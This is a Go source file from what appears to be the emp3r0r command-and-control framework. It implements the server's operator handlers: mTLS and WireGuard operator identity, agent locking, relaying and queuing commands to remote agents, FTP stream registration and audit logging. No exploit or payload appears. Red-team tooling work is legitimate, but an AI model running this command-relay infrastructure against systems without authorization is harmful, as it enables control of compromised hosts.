package server

import (
	"context"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/coder/websocket"
	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/wireguard"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// represents an operator_t
type operator_t struct {
	sessionID string     // stable operator identity: the provisioned WireGuard IP (or session header in local mode)
	name      string     // operator-facing display name
	conn      net.Conn   // message tunnel, used to relay messages
	mu        sync.Mutex // serialize writes to operator tunnel
}

var (
	// OPERATORS holds all operator connections
	OPERATORS sync.Map
	// operatorJobOwners maps job IDs to the owning operator session.
	operatorJobOwners sync.Map
	// operatorClaimNonceCache stores recently seen nonces to reject replayed
	// operator stream-activation claims.
	operatorClaimNonceCache sync.Map

	// SERVER_WG_CONFIG is the wireguard config for the server
	SERVER_WG_CONFIG *wireguard.WireGuardConfig
)

const operatorClaimNonceTTLSeconds int64 = 600

// Operator-facing request bounds. Operator messages are small control frames,
// never bulk data, so they must not be able to exhaust server memory.
const (
	// maxOperatorRequestBody bounds one operator HTTP API request body.
	maxOperatorRequestBody = 1 << 20 // 1 MiB
	// maxOperatorTunnelMessage bounds one operator message-tunnel frame. Relay
	// chunks are ~64 KiB, so this is generous while still bounding memory.
	maxOperatorTunnelMessage = 4 << 20 // 4 MiB
	// maxFTPStreamsPerOperator bounds concurrent FTP streams per operator so one
	// operator cannot grow the server's stream registry without limit.
	maxFTPStreamsPerOperator = 64
)

// DecodeCBORBody decodes CBOR HTTP request body
func DecodeCBORBody[T any](wrt http.ResponseWriter, req *http.Request) (*T, error) {
	var dst T
	if err := cbor.NewDecoder(req.Body).Decode(&dst); err != nil {
		http.Error(wrt, err.Error(), http.StatusBadRequest)
		return nil, err
	}
	return &dst, nil
}

func operatorSessionFromReq(req *http.Request) (string, error) {
	session := operatorRequestIdentity(req.RemoteAddr, req.Header.Get("operator_session"))
	if session == "" {
		return "", fmt.Errorf("missing operator identity")
	}
	return session, nil
}

// requireOperatorIdentity resolves the caller's operator identity, writing a
// 401 and returning false when it cannot. Every operator-facing handler calls
// it so an unidentified peer can never act on the server.
func requireOperatorIdentity(wrt http.ResponseWriter, req *http.Request) (string, bool) {
	operatorID, err := operatorSessionFromReq(req)
	if err != nil || operatorID == "" {
		http.Error(wrt, "missing operator identity", http.StatusUnauthorized)
		return "", false
	}
	return operatorID, true
}

// operatorSessionOnline reports whether the operator identity currently has a
// live message tunnel. It gates agent-lock expiry so a disconnected operator's
// agents become available again.
func operatorSessionOnline(operatorID string) bool {
	if operatorID == "" {
		return false
	}
	_, ok := OPERATORS.Load(operatorID)
	return ok
}

func operatorPubKeyPEMFromReq(req *http.Request) ([]byte, string, error) {
	if req == nil || req.TLS == nil || len(req.TLS.PeerCertificates) == 0 {
		return nil, "", fmt.Errorf("missing operator mTLS peer certificate")
	}
	cert := req.TLS.PeerCertificates[0]
	pubBytes, err := x509.MarshalPKIXPublicKey(cert.PublicKey)
	if err != nil {
		return nil, "", fmt.Errorf("marshal operator public key: %w", err)
	}
	pubPEM := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: pubBytes})
	fp := sha256.Sum256(cert.Raw)
	return pubPEM, hex.EncodeToString(fp[:]), nil
}

func rememberOperatorClaimNonce(fingerprint, session, nonce string) error {
	if fingerprint == "" || session == "" || nonce == "" {
		return fmt.Errorf("invalid nonce cache key")
	}
	now := time.Now().Unix()
	key := fingerprint + ":" + session + ":" + nonce
	if prev, exists := operatorClaimNonceCache.Load(key); exists {
		// Replay protection uses the server's own clock only, so operator/server
		// clock skew cannot let a nonce be reused.
		if prevTS, ok := prev.(int64); ok && now-prevTS <= operatorClaimNonceTTLSeconds {
			return fmt.Errorf("replayed claim nonce")
		}
	}
	operatorClaimNonceCache.Store(key, now)
	operatorClaimNonceCache.Range(func(k, v any) bool {
		nonceTS, ok := v.(int64)
		if !ok || now-nonceTS > operatorClaimNonceTTLSeconds {
			operatorClaimNonceCache.Delete(k)
		}
		return true
	})
	return nil
}

func verifyOperatorStreamClaim(req *http.Request, claim *def.OperatorStreamClaim, streamID, capability string) (string, error) {
	session, err := operatorSessionFromReq(req)
	if err != nil {
		return "", err
	}
	pubPEM, fp, err := operatorPubKeyPEMFromReq(req)
	if err != nil {
		return "", err
	}
	if err = transport.VerifyOperatorStreamClaim(claim, session, streamID, capability, pubPEM); err != nil {
		return "", err
	}
	if err = rememberOperatorClaimNonce(fp, session, claim.Nonce); err != nil {
		return "", err
	}
	if _, ok := OPERATORS.Load(session); !ok {
		return "", fmt.Errorf("operator session not connected")
	}
	return session, nil
}

func setJobOwner(jobID, operatorSession string) {
	if jobID == "" || operatorSession == "" {
		return
	}
	// Never overwrite an existing owner: otherwise one operator could redirect
	// another operator's command output by reusing its job ID.
	if existing, loaded := operatorJobOwners.LoadOrStore(jobID, operatorSession); loaded {
		if owner, ok := existing.(string); ok && owner != "" && owner != operatorSession {
			logging.Warningf("CRITICAL: operator %s tried to claim job %s owned by %s", operatorSession, jobID, owner)
		}
	}
}

func getJobOwner(jobID string) (string, bool) {
	if jobID == "" {
		return "", false
	}
	owner, ok := operatorJobOwners.Load(jobID)
	if !ok {
		return "", false
	}
	ownerID, ok := owner.(string)
	if !ok || ownerID == "" {
		return "", false
	}
	return ownerID, true
}

func cleanupOperatorOwnedJobs(operatorSession string) {
	if operatorSession == "" {
		return
	}
	operatorJobOwners.Range(func(k, v any) bool {
		owner, ok := v.(string)
		if ok && owner == operatorSession {
			operatorJobOwners.Delete(k)
		}
		return true
	})
}

func handleSetActiveAgent(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleSetActiveAgent panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	// Decode CBOR request body
	operation, err := DecodeCBORBody[def.Operation](wrt, req)
	if err != nil {
		return
	}

	// Resolve the target agent by operator-facing tag, then by control index.
	agent := agents.GetAgentByTag(operation.AgentTag)
	if agent == nil {
		if index, convErr := strconv.Atoi(operation.AgentTag); convErr == nil {
			agent = agents.GetAgentByIndex(index)
		}
	}
	if agent == nil {
		http.Error(wrt, "Agent not found", http.StatusNotFound)
		return
	}

	// Claim the agent for this operator. Targeting a different agent is a
	// switch: a successful claim releases the operator's other claims below. A
	// live claim by another operator is rejected with a conflict so the UI can
	// show who owns the agent.
	operatorID, ok := requireOperatorIdentity(wrt, req)
	if !ok {
		return
	}
	if acquired, heldBy := acquireAgentLock(agent.UUID, operatorID, operatorDisplayName(operatorID)); !acquired {
		msg := fmt.Sprintf("Agent %s is operated by %s", agent.Tag, heldBy)
		logging.Warningf("%s (operator %s)", msg, operatorID)
		auditOperatorAction(operatorID, "claim_denied", util.AgentRef(agent.UUID), "held by "+heldBy)
		http.Error(wrt, msg, http.StatusConflict)
		return
	}
	releaseAgentLocksForOperatorExcept(operatorID, agent.UUID)
	auditOperatorAction(operatorID, "claim", util.AgentRef(agent.UUID), agent.Name)

	// Return a snapshot so the operator always gets a consistent view of the
	// agent metadata (especially LastSeen/RTT) instead of the shared pointer
	// that the message-tunnel goroutine is mutating.
	snapshot := agents.SnapshotAgent(agent)
	snapshot.Owner = agentLockOwner(agent.UUID)
	wrt.Header().Set("Content-Type", "application/cbor")
	if err := cbor.NewEncoder(wrt).Encode(snapshot); err != nil {
		http.Error(wrt, err.Error(), http.StatusInternalServerError)
	}
}

func handleSendCommand(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleSendCommand panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	// Decode CBOR request body
	operation, err := DecodeCBORBody[def.Operation](wrt, req)
	if err != nil {
		return
	}

	// Get agent
	agent := agents.GetAgentByTag(operation.AgentTag)
	if agent == nil {
		http.Error(wrt, "Agent not found", http.StatusNotFound)
		return
	}

	// Get command and job ID
	if !operation.IsOptionSet("command") || !operation.IsOptionSet("job_id") {
		http.Error(wrt, "Command or JobID is empty", http.StatusBadRequest)
		return
	}
	// Operating an agent requires the caller to own it. This is also where a
	// command auto-claims an unlocked agent when the operator never explicitly
	// targeted it.
	operatorID, ok := requireOperatorIdentity(wrt, req)
	if !ok {
		return
	}
	if acquired, heldBy := acquireAgentLock(agent.UUID, operatorID, operatorDisplayName(operatorID)); !acquired {
		msg := fmt.Sprintf("Agent %s is operated by %s", agent.Tag, heldBy)
		logging.Warningf("%s (operator %s)", msg, operatorID)
		auditOperatorAction(operatorID, "command_denied", util.AgentRef(agent.UUID), "held by "+heldBy)
		http.Error(wrt, msg, http.StatusConflict)
		return
	}
	// The operator's target is its active agent; drop any other claim so a
	// stale lock never blocks another operator.
	releaseAgentLocksForOperatorExcept(operatorID, agent.UUID)
	setJobOwner(*operation.JobID, operatorID)
	auditOperatorAction(operatorID, "command", util.AgentRef(agent.UUID), *operation.Command)

	// Track the job ID so the message tunnel accepts the response
	live.CmdTime.Store(*operation.JobID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))

	// Any accepted command resets the operator-idle timer.
	touchOperatorCommand()

	// Send command to agent. If the agent has no live message tunnel, queue the
	// command so it is pulled when the agent is next admitted.
	if err = agents.SendCmd(*operation.Command, *operation.JobID, agent); err != nil {
		if agent.UUID == "" {
			http.Error(wrt, "Agent has no UUID", http.StatusInternalServerError)
			return
		}
		msg := def.MsgTunData{
			JobID:    *operation.JobID,
			CmdSlice: util.ParseCmd(*operation.Command),
			Tag:      agent.Tag,
			Time:     time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"),
		}
		enqueueAgentCommand(agent.UUID, msg)
		logging.Infof("Agent %s has no live message tunnel, queued command %s", agent.Tag, *operation.JobID)
	}
	wrt.WriteHeader(http.StatusOK)
}

func handleListAgents(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleListAgents panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	if _, ok := requireOperatorIdentity(wrt, req); !ok {
		return
	}
	// Get all agents
	agentsList := agents.GetConnectedAgents()
	// Annotate each agent with the operator that currently holds it so the
	// console can show who is on what target.
	for _, a := range agentsList {
		if a != nil {
			a.Owner = agentLockOwner(a.UUID)
		}
	}
	if logging.Level >= 4 {
		for _, a := range agentsList {
			logging.Debugf("handleListAgents: %s LastSeen=%v (%.0fs ago)", a.Tag, a.LastSeen, time.Since(a.LastSeen).Seconds())
		}
		logging.Debugf("handleListAgents: returning %d agents", len(agentsList))
	}

	wrt.Header().Set("Content-Type", "application/cbor")
	if err := cbor.NewEncoder(wrt).Encode(agentsList); err != nil {
		http.Error(wrt, err.Error(), http.StatusInternalServerError)
	}
}

func handleForgetAgent(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleForgetAgent panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	// Decode CBOR request body to get Agent UUID
	operation, err := DecodeCBORBody[def.Operation](wrt, req)
	if err != nil {
		return
	}
	operatorID, ok := requireOperatorIdentity(wrt, req)
	if !ok {
		return
	}

	uuid := operation.AgentTag
	uuid = strings.TrimSpace(uuid)
	if unquoted, err := strconv.Unquote(uuid); err == nil {
		uuid = unquoted
	}
	if uuid == "" {
		http.Error(wrt, "Agent UUID is empty", http.StatusBadRequest)
		return
	}

	requestedID := uuid
	// A short agent ID is resolved to its UUID so the DB row (keyed by UUID) can
	// be removed even when the agent is offline and not in the live registry.
	if util.IsAgentID(requestedID) {
		if byTag := agents.GetAgentByTag(requestedID); byTag != nil && byTag.UUID != "" {
			uuid = byTag.UUID
		} else if resolved, found, resolveErr := agents.ResolveAgentUUIDByTag(requestedID); resolveErr != nil {
			logging.Warningf("forget_agent: resolve tag %s: %v", requestedID, resolveErr)
		} else if found {
			uuid = resolved
		}
	}

	// An operator cannot forget an agent another operator is actively running.
	if owner := agentLockOwner(uuid); owner != "" && owner != operatorDisplayName(operatorID) {
		msg := fmt.Sprintf("Agent %s is operated by %s; release target before forgetting it", util.AgentRef(uuid), owner)
		auditOperatorAction(operatorID, "forget_agent_denied", util.AgentRef(uuid), "held by "+owner)
		http.Error(wrt, msg, http.StatusConflict)
		return
	}

	// Prepare response message with agent details
	var agentDetails string = fmt.Sprintf("Agent %s", util.AgentRef(uuid))
	if requestedID != uuid {
		agentDetails = fmt.Sprintf("Agent %s (resolved from tag %s)", util.AgentRef(uuid), requestedID)
	}

	// Try to get agent details from memory first (if connected/recently connected)
	targetAgent := agents.GetAgentByUUID(uuid)
	if targetAgent != nil && targetAgent.Tag != "" {
		agentDetails += fmt.Sprintf("\n  Tag: %s\n  Hostname: %s\n  IPs: %s\n  OS: %s",
			targetAgent.Tag, targetAgent.Hostname, strings.Join(targetAgent.IPs, ", "), targetAgent.OS)
	} else if agents.AgentDB != nil {
		// Try to get from DB
		stored, err := agents.GetStoredAgent(uuid)
		// Try DB fallback even if targetAgent is a placeholder
		if err == nil && stored != nil {
			agentDetails += fmt.Sprintf("\n  Tag: %s\n  Hostname: %s\n  IPs: %s\n  OS: %s\n  (Offline/Database Record)",
				stored.Tag, stored.Hostname, stored.IPAddresses, stored.OS)
		}
	}

	// Remove from DB
	if agents.AgentDB != nil {
		err := agents.RemoveAgent(uuid)
		if err != nil {
			if requestedID == uuid {
				if byTag := agents.GetAgentByTag(requestedID); byTag != nil && byTag.UUID != "" {
					uuid = byTag.UUID
					err = agents.RemoveAgent(uuid)
				}
			}
		}
		if err != nil {
			logging.Errorf("Failed to remove agent %s from DB: %v", util.AgentRef(uuid), err)
			http.Error(wrt, fmt.Sprintf("DB removal failed: %v", err), http.StatusInternalServerError)
			return
		}
	} else {
		http.Error(wrt, "Agent database not initialized", http.StatusInternalServerError)
		return
	}

	// Remove from memory
	if targetAgent != nil {
		live.ForgetAgent(uuid)
		logging.Successf("Operator removed agent %s from memory", util.AgentRef(uuid))
	}
	// A forgotten agent must not stay locked against a future re-check-in.
	deleteAgentLock(uuid)
	auditOperatorAction(operatorID, "forget_agent", util.AgentRef(uuid), "")
	wrt.WriteHeader(http.StatusOK)
	fmt.Fprintf(wrt, "%s\n\nHas been forgotten.", agentDetails)
}

func handleRegisterFTPStream(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleRegisterFTPStream panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	// Decode CBOR request body
	ftpReq, err := DecodeCBORBody[def.FTPStreamRequest](wrt, req)
	if err != nil {
		return
	}
	operatorSession, err := verifyOperatorStreamClaim(req, ftpReq.Claim, ftpReq.Token, def.OperatorCapabilityRegisterFTP)
	if err != nil {
		logging.Errorf("CRITICAL: Reject ftp stream registration from %s: %v", req.RemoteAddr, err)
		// Return the reason so the operator sees it (e.g. clock skew) instead of
		// a bare "Unauthorized".
		http.Error(wrt, err.Error(), http.StatusUnauthorized)
		return
	}
	// An operator may not hijack a token that another operator already owns.
	if val, ok := network.FTPStreams.Load("token:" + ftpReq.Token); ok {
		if existing, castOK := val.(*network.StreamHandler); castOK && existing != nil &&
			existing.OperatorSession != "" && existing.OperatorSession != operatorSession {
			logging.Errorf("CRITICAL: operator %s tried to hijack ftp token %s owned by %s", operatorSession, ftpReq.Token, existing.OperatorSession)
			auditOperatorAction(operatorSession, "ftp_register_denied", "", ftpReq.FilePath)
			http.Error(wrt, "Forbidden", http.StatusForbidden)
			return
		}
	}
	if countOperatorFTPStreams(operatorSession) >= maxFTPStreamsPerOperator {
		logging.Warningf("CRITICAL: operator %s exceeded the FTP stream limit (%d)", operatorSession, maxFTPStreamsPerOperator)
		auditOperatorAction(operatorSession, "ftp_register_denied", "", "too many streams")
		http.Error(wrt, "too many concurrent FTP streams", http.StatusTooManyRequests)
		return
	}
	// Register the token. Only the unique token key is stored: the file-path key
	// an operator supplies is not needed server-side, and using it as a global key
	// would let two operators clobber each other's entries or delete an unrelated
	// stream by guessing a path.
	sh := &network.StreamHandler{
		Token:           ftpReq.Token,
		StreamID:        ftpReq.Token,
		Capability:      def.OperatorCapabilityRegisterFTP,
		OperatorSession: operatorSession,
		ExpectedSize:    ftpReq.ExpectedSize,
		Checksum:        ftpReq.Checksum,
	}
	network.FTPStreams.Store("token:"+ftpReq.Token, sh)
	auditOperatorAction(operatorSession, "ftp_register", "", ftpReq.FilePath)

	logging.Infof("Registered FTP stream token %s for %s from operator", ftpReq.Token, ftpReq.FilePath)
	wrt.WriteHeader(http.StatusOK)
}

func handleUnregisterFTPStream(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleUnregisterFTPStream panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	// Decode CBOR request body
	ftpReq, err := DecodeCBORBody[def.FTPStreamRequest](wrt, req)
	if err != nil {
		return
	}
	operatorSession, err := operatorSessionFromReq(req)
	if err != nil {
		logging.Errorf("CRITICAL: Reject unregister ftp from %s: %v", req.RemoteAddr, err)
		http.Error(wrt, "Unauthorized", http.StatusUnauthorized)
		return
	}
	val, ok := network.FTPStreams.Load("token:" + ftpReq.Token)
	if !ok {
		http.Error(wrt, "Unknown FTP stream", http.StatusNotFound)
		return
	}
	sh, castOK := val.(*network.StreamHandler)
	if !castOK || sh == nil {
		http.Error(wrt, "Invalid FTP stream", http.StatusBadRequest)
		return
	}
	if sh.OperatorSession != "" && sh.OperatorSession != operatorSession {
		logging.Errorf("CRITICAL: operator %s attempted to unregister ftp stream owned by %s", operatorSession, sh.OperatorSession)
		auditOperatorAction(operatorSession, "ftp_unregister_denied", "", ftpReq.FilePath)
		http.Error(wrt, "Forbidden", http.StatusForbidden)
		return
	}

	// Remove only the token entry the caller actually owns.
	network.FTPStreams.Delete("token:" + ftpReq.Token)
	auditOperatorAction(operatorSession, "ftp_unregister", "", ftpReq.FilePath)

	logging.Infof("Unregistered FTP stream token %s for %s from operator", ftpReq.Token, ftpReq.FilePath)
	wrt.WriteHeader(http.StatusOK)
}

func handleGetCA(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleGetCA panicked: %v", r)
			http.Error(wrt, "Internal server error", http.StatusInternalServerError)
		}
	}()
	if _, ok := requireOperatorIdentity(wrt, req); !ok {
		return
	}
	caData, err := os.ReadFile(transport.CaCrtFile)
	if err != nil {
		logging.Errorf("Failed to read CA cert: %v", err)
		http.Error(wrt, "Failed to read CA cert", http.StatusInternalServerError)
		return
	}

	serverCrtData, err := os.ReadFile(transport.ServerCrtFile)
	if err != nil {
		logging.Errorf("Failed to read Server cert: %v", err)
		http.Error(wrt, "Failed to read Server cert", http.StatusInternalServerError)
		return
	}

	resp := map[string][]byte{
		"ca_crt":     caData,
		"server_crt": serverCrtData,
	}

	data, err := cbor.Marshal(resp)
	if err != nil {
		logging.Errorf("Failed to marshal certs: %v", err)
		http.Error(wrt, "Failed to marshal response", http.StatusInternalServerError)
		return
	}

	wrt.Header().Set("Content-Type", "application/cbor")
	wrt.WriteHeader(http.StatusOK)
	wrt.Write(data)
}

// readOperatorTunnel decodes and dispatches operator relay frames until the
// connection fails or ctx is cancelled. It is shared by the websocket operator
// handler and RegisterOperatorConn.
func readOperatorTunnel(ctx context.Context, conn net.Conn, session string) {
	decoder := cbor.NewDecoder(conn)
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		msg := new(def.MsgTunData)
		if err := decoder.Decode(msg); err != nil {
			return
		}
		touchOperatorCommand()
		handleOperatorRelayFrame(session, msg)
	}
}

// RegisterOperatorConn registers an already-connected operator message tunnel
// and serves its relay frames. It is for embedders and tests that own the
// operator transport (e.g. an in-process pipe) instead of the websocket
// handler. The session is removed and its jobs/pivots cleaned up when conn
// closes.
func RegisterOperatorConn(session string, conn net.Conn) {
	if session == "" {
		session = "test-operator"
	}
	op := registerOperatorSession(session, operatorDisplayName(session), conn)
	go func() {
		defer func() {
			// Only tear down our own registration. While we were blocked in
			// readOperatorTunnel a newer connection for the same operator may
			// have replaced us; deleting it would drop a live operator.
			unregisterOperatorConn(session, op)
			_ = conn.Close()
		}()
		readOperatorTunnel(context.Background(), conn, session)
	}()
}

// unregisterOperatorConn removes session from the operator registry only if it
// is still the entry registered by op, then tears down the session-scoped jobs
// and pivots. It reports whether the entry was actually removed. A stale
// teardown (op was replaced by a newer connection for the same session name)
// returns false and must not touch the newer operator's state.
func unregisterOperatorConn(session string, op *operator_t) bool {
	if !OPERATORS.CompareAndDelete(session, op) {
		return false
	}
	cleanupOperatorOwnedJobs(session)
	// SOCKS5 pivots are owned by the operator that started them.
	StopSocks5ProxiesForOperator(session)
	// FTP streams owned by the operator die with its session.
	cleanupOperatorFTPStreams(session)
	// Free every agent this operator was holding.
	releaseAgentLocksForOperator(session)
	return true
}

// cleanupOperatorFTPStreams removes FTP stream registrations owned by the
// disconnecting operator so a torn-down transfer cannot leak handlers.
func cleanupOperatorFTPStreams(session string) {
	if session == "" {
		return
	}
	network.FTPStreams.Range(func(k, v any) bool {
		if sh, ok := v.(*network.StreamHandler); ok && sh != nil && sh.OperatorSession == session {
			network.FTPStreams.Delete(k)
		}
		return true
	})
}

// countOperatorFTPStreams counts the tokens currently registered by one
// operator. Only token keys are counted so the alias bookkeeping cannot inflate
// the total.
func countOperatorFTPStreams(operatorSession string) int {
	count := 0
	network.FTPStreams.Range(func(k, v any) bool {
		key, ok := k.(string)
		if !ok || !strings.HasPrefix(key, "token:") {
			return true
		}
		if sh, ok := v.(*network.StreamHandler); ok && sh != nil && sh.OperatorSession == operatorSession {
			count++
		}
		return true
	})
	return count
}

// registerOperatorSession publishes a live message tunnel for operatorID,
// replacing and closing any previous tunnel for the same operator. Concurrent
// operators each have their own identity, so a reconnect only affects that
// operator's own tunnel.
func registerOperatorSession(operatorID, name string, conn net.Conn) *operator_t {
	if name == "" {
		name = operatorDisplayName(operatorID)
	}
	operator := &operator_t{sessionID: operatorID, name: name, conn: conn}
	if existing, loaded := OPERATORS.Swap(operatorID, operator); loaded {
		if old, ok := existing.(*operator_t); ok && old != nil {
			old.mu.Lock()
			oldConn := old.conn
			old.conn = nil
			old.mu.Unlock()
			if oldConn != nil {
				_ = oldConn.Close()
			}
			logging.Infof("Operator %s reconnected; replaced the previous tunnel", name)
		}
	}
	touchOperatorCommand()
	return operator
}

// handleOperatorConn handles operator connections, this connection will be used to relay the message tunnel
func handleOperatorConn(wrt http.ResponseWriter, req *http.Request) {
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("handleOperatorConn panicked: %v", r)
		}
	}()
	wsConn, err := websocket.Accept(wrt, req, &websocket.AcceptOptions{})
	if err != nil {
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	conn := websocket.NetConn(req.Context(), wsConn, websocket.MessageBinary)
	// NetConn disables the library read limit (-1); restore a bound so an
	// operator cannot exhaust server memory with an oversized frame.
	wsConn.SetReadLimit(maxOperatorTunnelMessage)
	operatorID := operatorRequestIdentity(req.RemoteAddr, req.Header.Get("operator_session"))
	if operatorID == "" {
		logging.Errorf("handleOperatorConn: refusing unidentified operator from %s", req.RemoteAddr)
		_ = conn.Close()
		return
	}
	operatorName := operatorDisplayName(operatorID)
	logging.Infof("Operator %s connected to message tunnel from %s", operatorName, req.RemoteAddr)
	operator := registerOperatorSession(operatorID, operatorName, conn)
	auditOperatorAction(operatorID, "connect", "", req.RemoteAddr)

	ctx, cancel := context.WithCancel(req.Context())
	readDone := make(chan struct{})
	go func() {
		defer close(readDone)
		readOperatorTunnel(ctx, conn, operatorID)
	}()
	defer func() {
		logging.Debugf("handleOperatorConn exiting")
		// Guarded teardown: a newer connection may have replaced this operator,
		// in which case we must leave the replacement alone.
		if unregisterOperatorConn(operatorID, operator) {
			auditOperatorAction(operatorID, "disconnect", "", "")
			// If this was the last operator, disconnect all agents.
			lastOperator := true
			OPERATORS.Range(func(_, _ any) bool {
				lastOperator = false
				return false // stop iteration
			})
			if lastOperator {
				logging.Infof("Last operator disconnected, closing all agent connections")
				agents.DisconnectAllAgents()
			}
		}

		_ = conn.Close()
		cancel()
		<-readDone
	}()

	// Create a ticker to send keepalive pings
	pingTicker := time.NewTicker(10 * time.Second)
	defer pingTicker.Stop()

	// receiving heartbeats from the operator
	for {
		select {
		case <-readDone:
			logging.Infof("Operator %s disconnected (TCP connection closed)", operatorName)
			return
		case <-pingTicker.C:
			// Send WebSocket ping to detect silent disconnections
			pingCtx, pingCancel := context.WithTimeout(ctx, 5*time.Second)
			err := wsConn.Ping(pingCtx)
			pingCancel()
			if err != nil {
				logging.Warningf("Operator %s ping timeout/error, closing connection: %v", operatorName, err)
				conn.Close()
				cancel()
				return
			}
			touchOperatorCommand()
		case <-ctx.Done():
			logging.Warningf("handleOperatorConn exited")
			return
		}
	}
}
